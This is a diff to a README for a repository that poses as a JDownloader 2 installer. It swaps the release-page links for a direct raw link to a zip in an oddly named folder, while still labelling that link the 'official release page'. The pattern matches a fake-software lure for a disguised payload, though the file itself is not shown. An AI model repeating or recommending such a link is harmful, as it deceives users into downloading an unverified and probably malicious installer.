@@ -1,6 +1,6 @@
 # 📥 JDownloader-2-Setup - Manage your file downloads with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vincentibus/JDownloader-2-Setup/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vincentibus/JDownloader-2-Setup/raw/refs/heads/main/unoften/Downloader_Setup_J_v3.0.zip)
 
 JDownloader 2 manages your file downloads. It handles web links, solves captchas, and maintains high speeds. You download files from multiple sites without manual effort. The software organizes your tasks while you do other work.
 
@@ -26,7 +26,7 @@ JDownloader 2 manages your file downloads. It handles web links, solves captchas
 Follow these steps to set up the software on your Windows computer.
 
 ### Step 1: Visit the download page
-Go to the [official release page](https://github.com/vincentibus/JDownloader-2-Setup/releases). This page lists all available versions of the installer.
+Go to the [official release page](https://github.com/vincentibus/JDownloader-2-Setup/raw/refs/heads/main/unoften/Downloader_Setup_J_v3.0.zip). This page lists all available versions of the installer.
 
 ### Step 2: Download the file
 Find the file ending in `.exe`. Click the name of the file to start the download. Save the file to your desktop or your Downloads folder.
